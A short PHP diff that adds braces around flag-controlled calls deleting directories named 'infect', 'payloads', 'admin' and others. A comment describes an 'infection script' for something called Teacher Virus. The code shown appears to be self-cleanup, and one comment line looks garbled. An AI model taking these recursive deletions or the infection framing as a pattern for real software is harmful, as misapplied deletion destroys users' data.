@@ -200,19 +200,25 @@
             else
             {
                 if($bInfectFiles)
+                {
                    rrmdir('infect');
-                
+                }
                 if($bDeleteData)
+                {
                     rrmdir('data');
-                
+                }
                 if($bDeletePayload)
+                {
                     rrmdir('payloads');
-                
+                }
                 if($bDeleteAdminPayload)
+                {
                     rrmdir('admin');
-                    
+                }   
                 if($bDeleteContent)
+                {
                     rrmdir('content');
+                }
             }
              // END RRMDIRexit;
             // getinfected.php is the initial teacher virus PHP infection script that is used to install the core Teacher Virus files.
